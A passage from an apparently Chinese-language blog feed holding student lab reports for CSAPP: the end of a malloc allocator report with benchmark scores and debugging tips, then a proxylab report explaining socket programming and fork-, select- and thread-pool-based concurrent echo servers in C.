mm_malloc(size);</span><br><span class="line">    <span class="keyword">if</span> (newptr == <span class="literal">NULL</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">    copySize = *(<span class="keyword">size_t</span> *)((<span class="keyword">char</span> *)oldptr - SIZE_T_SIZE);</span><br><span class="line">    <span class="keyword">if</span> (size &lt; copySize)</span><br><span class="line">        copySize = size;</span><br><span class="line">    <span class="built_in">memcpy</span>(newptr, oldptr, copySize);</span><br><span class="line">    mm_free(oldptr);</span><br><span class="line">    <span class="keyword">return</span> newptr;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure>
<h2 id="结果与总结">结果与总结</h2>
<p>使用 <code>mdriver</code> 评估，得到 87 分，结果如下：</p>
<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">Results for mm malloc:</span><br><span class="line">trace  valid  util     ops      secs  Kops</span><br><span class="line"> 0       yes   98%    5694  0.000160 35677</span><br><span class="line"> 1       yes   98%    5848  0.000198 29550</span><br><span class="line"> 2       yes   98%    6648  0.000217 30608</span><br><span class="line"> 3       yes   99%    5380  0.000140 38346</span><br><span class="line"> 4       yes   99%   14400  0.000229 62772</span><br><span class="line"> 5       yes   91%    4800  0.000250 19215</span><br><span class="line"> 6       yes   90%    4800  0.000260 18462</span><br><span class="line"> 7       yes   55%   12000  0.000213 56259</span><br><span class="line"> 8       yes   51%   24000  0.000432 55543</span><br><span class="line"> 9       yes   17%   14401  0.000527 27300</span><br><span class="line">10       yes   57%   14401  0.000268 53695</span><br><span class="line">Total          78%  112372  0.002895 38812</span><br><span class="line"></span><br><span class="line">Perf index = 47 (util) + 40 (thru) = 87/100</span><br><span class="line">correct:11</span><br><span class="line">perfidx:87</span><br></pre></td></tr></tbody></table></figure>
<p>虽然没有拿到满分，但整体做完还是非常酣畅淋漓的体验。从学完之后满腹经纶但又无从下手，到摸索如何设计与抽象函数，再到被各种段错误折磨，最后豁然开朗、茅塞顿开，用 “酣畅淋漓” 这四个字形容在合适不过了！</p>
<h2 id="实验可能遇到的问题">实验可能遇到的问题</h2>
<h3 id="traces路径问题">traces 路径问题</h3>
<p>在 <code>config.h</code> 中，修改 TRACEDIR 为相对路径。</p>
<figure class="highlight c"><table><tbody><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> TRACEDIR <span class="meta-string">"./traces/"</span></span></span><br></pre></td></tr></tbody></table></figure>
<h3 id="asmerrno.h-no-such-file-or-directory">asm/errno.h: No such file
or directory</h3>
<p>参见 stackoverflow：<a href="https://stackoverflow.com/questions/14795608/asm-errno-h-no-such-file-or-directory">linux
- asm/errno.h: No such file or directory - Stack Overflow</a></p>
<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">ln -s /usr/include/asm-generic /usr/include/asm</span><br></pre></td></tr></tbody></table></figure>
<h3 id="段错误">段错误</h3>
<p>为 GCC 添加 <code>-g</code> 参数创建用于调试的评测文件，使用 gdb 启动程序，发生段错误后输出 <code>bt</code>，即 <code>backtrace</code> 命令，即可打印出堆栈和报错行数，还可以打印不同变量的值。建议关闭 <code>-O2</code> 选项来避免变量被优化了无法查看值。</p>
<h2 id="参考">参考</h2>
<ul>
<li><a href="https://zhuanlan.zhihu.com/p/483719414">malloc
是如何分配内存的？ - 知乎 (zhihu.com)</a></li>
<li><a href="https://wdxtub.com/csapp/thin-csapp-7/2016/04/16/">【读薄
CSAPP】柒 虚拟内存与动态内存分配 | 小土刀 2.0 (wdxtub.com)</a></li>
<li><a href="https://www.cs.cmu.edu/afs/cs/academic/class/15213-f10/www/lectures/17-allocation-basic.pdf">17-allocation-basic.pdf
(cmu.edu)</a></li>
<li><a href="https://zhuanlan.zhihu.com/p/57863097">malloc 的实现原理
内存池 mmap sbrk 链表 - 知乎 (zhihu.com)</a></li>
<li><a href="https://jacktang816.github.io/post/mallocandfree/">malloc 和 free 的实现原理解析
- JackTang's Blog (jacktang816.github.io)</a></li>
</ul>
]]></content>
      <categories>
        <category>学习笔记</category>
        <category>体系结构</category>
        <category>csapp</category>
        <category>实验报告</category>
      </categories>
      <tags>
        <tag>学习笔记</tag>
        <tag>体系结构</tag>
        <tag>csapp</tag>
        <tag>实验报告</tag>
      </tags>
  </entry>
  <entry>
    <title>CSAPP-Lab-7 实验报告: proxylab</title>
    <url>/blog/2023/12/30/CSAPP-Lab-7/</url>
    <content><![CDATA[<h2 id="摘要">摘要</h2>
<p>本文介绍了笔者在做 proxylab 一节的实验报告。该 lab 旨在使用 C 语言实现简易的网络代理，通过实践 socket 编程来更好地从程序员的角度理解网络交互。</p>
<span id="more"></span>
<p>这一部分的实验其实难度不大，本篇更多的是梳理一些理论知识。</p>
<h2 id="理论知识">理论知识</h2>
<h3 id="socket通信">socket 通信</h3>
<p><strong>网络套接字</strong>（英语：Network
socket；又译<strong>网络套接字</strong>、<strong>网络接口</strong>、<strong>网络插槽</strong>）在计算机科学中是电脑网络中进程间收发数据的端点。socket 中往往包含协议族（IPV4、IPV6 等）、socket 类型（有无连接等）、传输层协议（TCP 或 UDP）等信息，与远端主机建立连接并进行通信。在 linux 上，一切 IO 都被抽象成了文件操作，网络 IO 也不例外，也是通过一系列函数调用得到代表网络连接的文件描述符（fd），接着就可以进行读写操作。从客户端和服务端的角度，一次 socket 通信的流程如下图所示：</p>
<p><img src="socket_interface.png"></p>
<p>客户端侧：</p>
<ol type="1">
<li><code>getaddrinfo</code> 获取服务端信息</li>
<li><code>socket</code> 创建 socket 对象，完全本地操作，不涉及网络通信</li>
<li><code>connect</code> 与远端服务端建立连接，获取文件描述符</li>
<li>通过 <code>read/write</code> 读写网络读写，<code>read</code> 阻塞，<code>write</code> 不阻塞</li>
<li><code>close</code> 关闭文件描述符</li>
</ol>
<p>服务端侧：</p>
<ol type="1">
<li><code>getaddrinfo</code> 获取服务端信息</li>
<li><code>socket</code> 创建 socket 对象，完全本地操作，不涉及网络通信</li>
<li><code>bind</code> 将 socket 与本地端口绑定</li>
<li><code>listen</code> 进入被动监听状态</li>
<li><code>accept</code> 阻塞等待新的连接到来</li>
<li>通过 <code>read/write</code> 读写网络读写，<code>read</code> 阻塞，<code>write</code> 不阻塞</li>
<li><code>close</code> 关闭文件描述符</li>
</ol>
<p>按照这个流程，可以写出如下的服务端程序：</p>
<figure class="highlight c"><table><tbody><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> **argv)</span></span></span><br><span class="line"><span class="function"></span>{</span><br><span class="line">    <span class="keyword">int</span> listenfd, connfd;</span><br><span class="line">    <span class="keyword">char</span> hostname[MAXLINE], port[MAXLINE];</span><br><span class="line">    <span class="keyword">socklen_t</span> clientlen;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">sockaddr_storage</span> <span class="title">clientaddr</span>;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Check command-line args */</span></span><br><span class="line">    <span class="keyword">if</span> (argc != <span class="number">2</span>)</span><br><span class="line">    {</span><br><span class="line">        <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"usage: %s &lt;port&gt;\n"</span>, argv[<span class="number">0</span>]);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">    }</span><br><span class="line">	<span class="comment">// 封装前几个步骤</span></span><br><span class="line">    listenfd = Open_listenfd(argv[<span class="number">1</span>]);</span><br><span class="line">    <span class="keyword">while</span> (<span class="number">1</span>)</span><br><span class="line">    {</span><br><span class="line">        clientlen = <span class="keyword">sizeof</span>(clientaddr);</span><br><span class="line">        <span class="comment">// 阻塞等待新连接</span></span><br><span class="line">        connfd = Accept(listenfd, (SA *)&amp;clientaddr, &amp;clientlen);</span><br><span class="line">        Getnameinfo((SA *)&amp;clientaddr, clientlen, hostname, MAXLINE,</span><br><span class="line">                    port, MAXLINE, <span class="number">0</span>);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"Accepted connection from (%s, %s)\n"</span>, hostname, port);</span><br><span class="line">        <span class="comment">// 与客户端交互</span></span><br><span class="line">        doit(connfd);</span><br><span class="line">        Close(connfd);</span><br><span class="line">    }</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure>
<p>这样的代码是有效的，但是缺点在于，每次只能处理一个客户端连接，其余的连接只能排队等到这个用户关闭连接后才能被受理。假设没有自动关闭连接的机制，连接中的用户离开电脑几个小时，服务端对外表现完全不可用，这是显然无法接受的。因此，服务端需要并行处理多个连接的能力。</p>
<h3 id="进程并发">进程并发</h3>
<p><code>fork</code> 创建子进程，用于处理客户端的读写，主进程只负责进行连接的建立，代码如下所示。</p>
<figure class="highlight c"><table><tbody><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> **argv)</span></span></span><br><span class="line"><span class="function"></span>{</span><br><span class="line">    <span class="keyword">int</span> listenfd, connfd;</span><br><span class="line">    <span class="keyword">socklen_t</span> clientlen;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">sockaddr_storage</span> <span class="title">clientaddr</span>;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (argc != <span class="number">2</span>)</span><br><span class="line">    {</span><br><span class="line">        <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"usage: %s &lt;port&gt;\n"</span>, argv[<span class="number">0</span>]);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    Signal(SIGCHLD, sigchld_handler);</span><br><span class="line">    listenfd = Open_listenfd(argv[<span class="number">1</span>]);</span><br><span class="line">    <span class="keyword">while</span> (<span class="number">1</span>)</span><br><span class="line">    {</span><br><span class="line">        clientlen = <span class="keyword">sizeof</span>(struct sockaddr_storage);</span><br><span class="line">        connfd = Accept(listenfd, (SA *)&amp;clientaddr, &amp;clientlen);</span><br><span class="line">        <span class="keyword">if</span> (Fork() == <span class="number">0</span>)</span><br><span class="line">        {</span><br><span class="line">            Close(listenfd); <span class="comment">/* Child closes its listening socket */</span></span><br><span class="line">            echo(connfd);    <span class="comment">/* Child services client */</span></span><br><span class="line">            Close(connfd);   <span class="comment">/* Child closes connection with client */</span></span><br><span class="line">            <span class="built_in">exit</span>(<span class="number">0</span>);         <span class="comment">/* Child exits */</span></span><br><span class="line">        }</span><br><span class="line">        Close(connfd); <span class="comment">/* Parent closes connected socket (important!) */</span></span><br><span class="line">    }</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure>
<p>这种方式有以下优点：</p>
<ul>
<li>安全：各个子进程有独立的地址空间，不会意外修改掉其他进程的内存。</li>
</ul>
<p>缺点在于：</p>
<ul>
<li>不便利：难以在父子进程或其他进程间共享状态，需要通过进程通信（IPC）的方式。</li>
<li>开销大：进程的创建、销毁、切换都需要很大的开销。</li>
</ul>
<h3 id="io多路复用">IO 多路复用</h3>
<p>也称为事件驱动的<strong>并发模型</strong>。利用 <code>select/epoll</code> 的系统调用，实现在一个进程内监听多个 IO 事件，并进行处理，核心代码如下。</p>
<figure class="highlight c"><table><tbody><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">"csapp.h"</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">{</span>                                <span class="comment">/* Represents a pool of connected descriptors */</span></span><br><span class="line">    <span class="keyword">int</span> maxfd;                   <span class="comment">/* Largest descriptor in read_set */</span></span><br><span class="line">    fd_set read_set;             <span class="comment">/* Set of all active descriptors */</span></span><br><span class="line">    fd_set ready_set;            <span class="comment">/* Subset of descriptors ready for reading */</span></span><br><span class="line">    <span class="keyword">int</span> nready;                  <span class="comment">/* Number of ready descriptors from select */</span></span><br><span class="line">    <span class="keyword">int</span> maxi;                    <span class="comment">/* High water index into client array */</span></span><br><span class="line">    <span class="keyword">int</span> clientfd[FD_SETSIZE];    <span class="comment">/* Set of active descriptors */</span></span><br><span class="line">    <span class="keyword">rio_t</span> clientrio[FD_SETSIZE]; <span class="comment">/* Set of active read buffers */</span></span><br><span class="line">} pool;</span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> byte_cnt = <span class="number">0</span>; <span class="comment">/* Counts total bytes received by server */</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> **argv)</span></span></span><br><span class="line"><span class="function"></span>{</span><br><span class="line">    <span class="keyword">int</span> listenfd, connfd;</span><br><span class="line">    <span class="keyword">socklen_t</span> clientlen;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">sockaddr_storage</span> <span class="title">clientaddr</span>;</span></span><br><span class="line">    <span class="keyword">static</span> pool pool;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (argc != <span class="number">2</span>)</span><br><span class="line">    {</span><br><span class="line">        <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"usage: %s &lt;port&gt;\n"</span>, argv[<span class="number">0</span>]);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    }</span><br><span class="line">    listenfd = Open_listenfd(argv[<span class="number">1</span>]);</span><br><span class="line">    init_pool(listenfd, &amp;pool);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> (<span class="number">1</span>)</span><br><span class="line">    {</span><br><span class="line">        <span class="comment">// 等待 新连接/已经建立连接的事件到来</span></span><br><span class="line">        pool.ready_set = pool.read_set;</span><br><span class="line">        pool.nready = Select(pool.maxfd + <span class="number">1</span>, &amp;pool.ready_set, <span class="literal">NULL</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 有新连接到来</span></span><br><span class="line">        <span class="keyword">if</span> (FD_ISSET(listenfd, &amp;pool.ready_set))</span><br><span class="line">        {</span><br><span class="line">            clientlen = <span class="keyword">sizeof</span>(struct sockaddr_storage);</span><br><span class="line">            connfd = Accept(listenfd, (SA *)&amp;clientaddr, &amp;clientlen);</span><br><span class="line">            <span class="comment">// 添加并开始监听新的客户端连接</span></span><br><span class="line">            add_client(connfd, &amp;pool);</span><br><span class="line">        }</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 检查已经建立连接的客户端事件，并进行处理</span></span><br><span class="line">        check_clients(&amp;pool);</span><br><span class="line">    }</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">add_client</span><span class="params">(<span class="keyword">int</span> connfd, pool *p)</span></span></span><br><span class="line"><span class="function"></span>{</span><br><span class="line">    <span class="keyword">int</span> i;</span><br><span class="line">    p-&gt;nready--;</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; FD_SETSIZE; i++) <span class="comment">/* Find an available slot */</span></span><br><span class="line">        <span class="keyword">if</span> (p-&gt;clientfd[i] &lt; <span class="number">0</span>)</span><br><span class="line">        {</span><br><span class="line">            <span class="comment">/* Add connected descriptor to the pool */</span></span><br><span class="line">            p-&gt;clientfd[i] = connfd;</span><br><span class="line">            Rio_readinitb(&amp;p-&gt;clientrio[i], connfd);</span><br><span class="line"></span><br><span class="line">            <span class="comment">/* Add the descriptor to descriptor set */</span></span><br><span class="line">            FD_SET(connfd, &amp;p-&gt;read_set);</span><br><span class="line"></span><br><span class="line">            <span class="comment">/* Update max descriptor and pool high water mark */</span></span><br><span class="line">            <span class="keyword">if</span> (connfd &gt; p-&gt;maxfd)</span><br><span class="line">                p-&gt;maxfd = connfd;</span><br><span class="line">            <span class="keyword">if</span> (i &gt; p-&gt;maxi)</span><br><span class="line">                p-&gt;maxi = i;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        }</span><br><span class="line">    <span class="keyword">if</span> (i == FD_SETSIZE) <span class="comment">/* Couldn’t find an empty slot */</span></span><br><span class="line">        app_error(<span class="string">"add_client error: Too many clients"</span>);</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">check_clients</span><span class="params">(pool *p)</span></span></span><br><span class="line"><span class="function"></span>{</span><br><span class="line">    <span class="keyword">int</span> i, connfd, n;</span><br><span class="line">    <span class="keyword">char</span> buf[MAXLINE];</span><br><span class="line">    <span class="keyword">rio_t</span> rio;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; (i &lt;= p-&gt;maxi) &amp;&amp; (p-&gt;nready &gt; <span class="number">0</span>); i++)</span><br><span class="line">    {</span><br><span class="line">        connfd = p-&gt;clientfd[i];</span><br><span class="line">        rio = p-&gt;clientrio[i];</span><br><span class="line"></span><br><span class="line">        <span class="comment">/* If the descriptor is ready, echo a text line from it */</span></span><br><span class="line">        <span class="keyword">if</span> ((connfd &gt; <span class="number">0</span>) &amp;&amp; (FD_ISSET(connfd, &amp;p-&gt;ready_set)))</span><br><span class="line">        {</span><br><span class="line">            p-&gt;nready--;</span><br><span class="line">            <span class="keyword">if</span> ((n = Rio_readlineb(&amp;rio, buf, MAXLINE)) != <span class="number">0</span>)</span><br><span class="line">            {</span><br><span class="line">                byte_cnt += n;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">"Server received %d (%d total) bytes on fd %d\n"</span>,</span><br><span class="line">                       n, byte_cnt, connfd);</span><br><span class="line">                Rio_writen(connfd, buf, n);</span><br><span class="line">            }</span><br><span class="line"></span><br><span class="line">            <span class="comment">/* EOF detected, remove descriptor from pool */</span></span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">            {</span><br><span class="line">                Close(connfd);</span><br><span class="line">                FD_CLR(connfd, &amp;p-&gt;read_set);</span><br><span class="line">                p-&gt;clientfd[i] = <span class="number">-1</span>;</span><br><span class="line">            }</span><br><span class="line">        }</span><br><span class="line">    }</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure>
<p>可以看出来，核心的逻辑在于维护要监听的 <code>fd</code> 列表，在一个循环中，使用 <code>Select</code> 反复监听 IO 事件到来，并进行处理：</p>
<ul>
<li>来自 <code>listenfd</code> 的新连接：通过 <code>Accept</code> 获取新的连接 <code>connfd</code>，添加到客户端列表中，并开始监听</li>
<li>来自已经建立连接的 <code>connfd</code> 的读写：读取并处理，如果收到 EOF，关闭连接移除监听</li>
</ul>
<p>这种方式有以下优点：</p>
<ul>
<li>灵活：程序员可以更好地控制程序的行为，比如为某些客户端优先提供服务。</li>
<li>单线程：只有一个线程，可以方便地在不同函数内共享全局变量，没有并发问题，也更利于调试。</li>
</ul>
<p>也有着以下缺点：</p>
<ul>
<li>编程复杂度：事件驱动的编程模型的复杂度是基于进程的方法的数倍，而且并发粒度越细，模型越复杂。对比之下，基于进程的方法容易设计出干净的代码结构。</li>
<li>无法利用多核优势：只使用了单线程。</li>
</ul>
<h3 id="线程并发">线程并发</h3>
<p>与进程的思想类似，使用线程来实现。</p>
<figure class="highlight c"><table><tbody><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">"csapp.h"</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">echo</span><span class="params">(<span class="keyword">int</span> connfd)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">void</span> *<span class="title">thread</span><span class="params">(<span class="keyword">void</span> *vargp)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> **argv)</span></span></span><br><span class="line"><span class="function"></span>{</span><br><span class="line">    <span class="keyword">int</span> listenfd, *connfdp;</span><br><span class="line">    <span class="keyword">socklen_t</span> clientlen;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">sockaddr_storage</span> <span class="title">clientaddr</span>;</span></span><br><span class="line">    <span class="keyword">pthread_t</span> tid;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (argc != <span class="number">2</span>)</span><br><span class="line">    {</span><br><span class="line">        <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"usage: %s &lt;port&gt;\n"</span>, argv[<span class="number">0</span>]);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    }</span><br><span class="line">    listenfd = Open_listenfd(argv[<span class="number">1</span>]);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> (<span class="number">1</span>)</span><br><span class="line">    {</span><br><span class="line">        clientlen = <span class="keyword">sizeof</span>(struct sockaddr_storage);</span><br><span class="line">        connfdp = Malloc(<span class="keyword">sizeof</span>(<span class="keyword">int</span>));</span><br><span class="line">        *connfdp = Accept(listenfd, (SA *)&amp;clientaddr, &amp;clientlen);</span><br><span class="line">        <span class="comment">// 创建新线程处理客户端的连接</span></span><br><span class="line">        Pthread_create(&amp;tid, <span class="literal">NULL</span>, thread, connfdp);</span><br><span class="line">    }</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="comment">/* Thread routine */</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> *<span class="title">thread</span><span class="params">(<span class="keyword">void</span> *vargp)</span></span></span><br><span class="line"><span class="function"></span>{</span><br><span class="line">    <span class="keyword">int</span> connfd = *((<span class="keyword">int</span> *)vargp);</span><br><span class="line">    Pthread_detach(pthread_self());</span><br><span class="line">    Free(vargp);</span><br><span class="line">    echo(connfd);</span><br><span class="line">    Close(connfd);</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure>
<p>还可以使用线程池的方法，通过复用线程进一步减少线程创建和销毁的开销，代码如下。这是一个典型的生产者 - 消费者模型，主线程作为生产者，通过 <code>Accept</code> 获取新连接，工作线程为消费者，处理新连接的读写逻辑。</p>
<figure class="highlight c"><table><tbody><tr><td class="code"><pre><span class="line"><span class="comment">// 线程安全的阻塞队列</span></span><br><span class="line"><span class="keyword">sbuf_t</span> sbuf; <span class="comment">/* Shared buffer of connected descriptors */</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> **argv)</span></span></span><br><span class="line"><span class="function"></span>{</span><br><span class="line">    <span class="keyword">int</span> i, listenfd, connfd;</span><br><span class="line">    <span class="keyword">socklen_t</span> clientlen;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">sockaddr_storage</span> <span class="title">clientaddr</span>;</span></span><br><span class="line">    <span class="keyword">pthread_t</span> tid;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (argc != <span class="number">2</span>)</span><br><span class="line">    {</span><br><span class="line">        <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"usage: %s &lt;port&gt;\n"</span>, argv[<span class="number">0</span>]);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    }</span><br><span class="line">    listenfd = Open_listenfd(argv[<span class="number">1</span>]);</span><br><span class="line"></span><br><span class="line">    sbuf_init(&amp;sbuf, SBUFSIZE);</span><br><span class="line">    <span class="comment">// 创建工作线程</span></span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; NTHREADS; i++)</span><br><span class="line">        Pthread_create(&amp;tid, <span class="literal">NULL</span>, thread, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> (<span class="number">1</span>)</span><br><span class="line">    {</span><br><span class="line">        clientlen = <span class="keyword">sizeof</span>(struct sockaddr_storage);</span><br><span class="line">        connfd = Accept(listenfd, (SA *)&amp;clientaddr, &amp;clientlen);</span><br><span class="line">        <span class="comment">// 将客户端连接存放在阻塞队列中</span></span><br><span class="line">        sbuf_insert(&amp;sbuf, connfd); <span class="comment">/* Insert connfd in buffer */</span></span><br><span class="line">    }</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> *<span class="title">thread</span><span class="params">(<span class="keyword">void</span> *vargp)</span></span></span><br><span class="line"><span class="function"></span>{</span><br><span class="line">    Pthread_detach(pthread_self());</span><br><span class="line">    <span class="keyword">while</span> (<span class="number">1</span>)</span><br><span class="line">    {</span><br><span class="line">        <span class="comment">// 阻塞等到获取客户端fd</span></span><br><span class="line">        <span class="keyword">int</span> connfd = sbuf_remove(&amp;sbuf);</span><br><span class="line">        <span class="comment">// 为客户端服务</span></span><br><span class="line">        echo_cnt(connfd);</span><br><span class="line">        Close(connfd);</span><br><span class="line">    }</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure>
<p>线程的方法有如下优点：</p>
<ul>
<li>方便共享状态：线程间共享地址空间</li>
<li>开销小：创建、销毁、切换的开销更小，且可以通过线程池进一步减少开销</li>
</ul>
<p>缺点在于：</p>
<ul>
<li>并发问题：无意识的共享可能会使得线程状态被污染，进而出错。还可能出现竞态条件、死锁等问题。</li>
</ul>
<h2 id="part-1">Part 1</h2>
<p>实现基础的 http 代理功能，需要做的事情很清晰：</p>
<ol type="1">
<li>接受客户端连接，解析 http 请求行（端口与 uri）与请求头</li>
<li>与目标服务器建立连接，初始化 http 请求行，设置代理请求头，转发额外请求头</li>
<li>将目标服务器的响应转发给客户端</li>
</ol>
<h2 id="part-2">Part 2</h2>
<p>实现代理服务器的并发。这里可以使用上面提到的线程池的方法，通过生产者 - 消费者的模式交互。先实现一个阻塞队列，<code>sbuf.h</code> 代码如下，队列中包含三个信号量，用于同步。<code>mutex</code> 控制了循环队列 <code>buf</code> 的互斥读写，<code>slots,items</code> 记录了队列中的空槽和物品的数量，控制生产者与消费者的等待逻辑。</p>
<figure class="highlight c"><table><tbody><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;semaphore.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">{</span></span><br><span class="line">    <span class="keyword">int</span> *buf;    <span class="comment">/* Buffer array */</span></span><br><span class="line">    <span class="keyword">int</span> n;       <span class="comment">/* Maximum number of slots */</span></span><br><span class="line">    <span class="keyword">int</span> front;   <span class="comment">/* buf[(front+1)%n] is first item */</span></span><br><span class="line">    <span class="keyword">int</span> rear;    <span class="comment">/* buf[rear%n] is last item */</span></span><br><span class="line">    <span class="keyword">sem_t</span> mutex; <span class="comment">/* Protects accesses to buf */</span></span><br><span class="line">    <span class="keyword">sem_t</span> slots; <span class="comment">/* Counts available slots */</span></span><br><span class="line">    <span class="keyword">sem_t</span> items; <span class="comment">/* Counts available items */</span></span><br><span class="line">} <span class="keyword">sbuf_t</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">sbuf_init</span><span class="params">(<span class="keyword">sbuf_t</span> *sp, <span class="keyword">int</span> n)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">sbuf_deinit</span><span class="params">(<span class="keyword">sbuf_t</span> *sp)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">sbuf_insert</span><span class="params">(<span class="keyword">sbuf_t</span> *sp, <span class="keyword">int</span> item)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">sbuf_remove</span><span class="params">(<span class="keyword">sbuf_t</span> *sp)</span></span>;</span><br></pre></td></tr></tbody></table></figure>
<p><code>sbuf.c</code> 代码如下。初始化时，队列为空，<code>slots</code> 为 <code>n</code>，物品数量为 0。在插入新元素时，需要先阻塞等到有空槽 <code>P(slots)</code>，再获取队列的互斥锁 <code>P(mutex)</code> 进行插入。在读取新元素时，需要先阻塞等到有元素 <code>P(items)</code>，再获取队列的互斥锁 <code>P(mutex)</code> 进行读取并删除。</p>
<figure class="highlight c"><table><tbody><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">"sbuf.h"</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">"csapp.h"</span></span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">sbuf_init</span><span class="params">(<span class="keyword">sbuf_t</span> *sp, <span class="keyword">int</span> n)</span></span></span><br><span class="line"><span class="function"></span>{</span><br><span class="line">    sp-&gt;buf = Calloc(n, <span class="keyword">sizeof</span>(<span class="keyword">int</span>));</span><br><span class="line">    sp-&gt;n = n;                  <span class="comment">/* Buffer holds max of n items */</span></span><br><span class="line">    sp-&gt;front = sp-&gt;rear = <span class="number">0</span>;   <span class="comment">/* Empty buffer iff front == rear */</span></span><br><span class="line">    Sem_init(&amp;sp-&gt;mutex, <span class="number">0</span>, <span class="number">1</span>); <span class="comment">/* Binary semaphore for locking */</span></span><br><span class="line">    Sem_init(&amp;sp-&gt;slots, <span class="number">0</span>, n); <span class="comment">/* Initially, buf has n empty slots */</span></span><br><span class="line">    Sem_init(&amp;sp-&gt;items, <span class="number">0</span>, <span class="number">0</span>); <span class="comment">/* Initially, buf has zero data items */</span></span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="comment">/* Clean up buffer sp */</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">sbuf_deinit</span><span class="params">(<span class="keyword">sbuf_t</span> *sp)</span></span></span><br><span class="line"><span class="function"></span>{</span><br><span class="line">    Free(sp-&gt;buf);</span><br><span class="line">}</span><br><span 